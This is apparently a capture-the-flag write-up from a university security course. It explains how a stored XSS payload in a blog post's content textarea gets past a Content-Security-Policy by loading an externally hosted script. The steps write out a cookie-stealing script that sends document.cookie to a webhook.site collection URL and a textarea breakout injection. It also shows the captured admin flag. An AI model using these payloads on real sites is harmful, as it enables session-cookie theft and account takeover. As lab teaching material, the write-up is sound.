# Challenge `Read my lips: No more scripts!` Writeup

- Vulnerability: Reflected XSS attack

- Where: On the blogpost creation, content textarea

- Impact: Allows to execute code on the client's browser, and steal cookies for example.

Note:  Now we can do the same exploit as before, we get this error `Content-Security-Policy: The page’s settings blocked an inline script (script-src-elem) from being executed because it violates the following directive: “script-src *”. Consider using a hash ('sha256-p0EW0fbVeRpPDgPfaLo33tftN0eF6L4C4PXmLYwtTzo=') or a nonce. 507a9a8be3d145a86daa9644b28bf42a8dc0720d8baeabdf0406c393692bf082:27:114` meaning that inline scripts are prevented, but the `Content-Security-Policy: The page’s settings blocked an inline script (script-src-elem) from being executed because it violates the following directive: “script-src *”.` allow us to load external scripts.

## Steps to reproduce

1. Create a website on [Webhook.site](https://webhook.site) and copy the URL of our fake website that will receive requests.
2. Create a script that will be executed by the client browser to redirect to our malicious website. (e.g, `<script>location='https://webhook.site/<unique-id>/'+document.cookie</script>`)
3. Host the script on [Técnico's personal page](https://web.tecnico.ulisboa.pt)
4. Send `</textarea><script src="https://web.tecnico.ulisboa.pt/<istid>/readmylips.js"></script>` on the blog post content textarea and send to admin review.
5. On the [Webhook.site](https://webhook.site) dashboard, analyze the request, and there will be a GET request with `SECRET=SSof{Inline_Scripts_are_not_allowed_with_this_CSP}` that is the admin cookie (it might be needed to to a URL decode).

- Note: The script needs to be hosted on the same server as the website, in this case is in the sigma tecnico cluster. If its not, we get `Cross-Origin Read Blocking (CORB)`.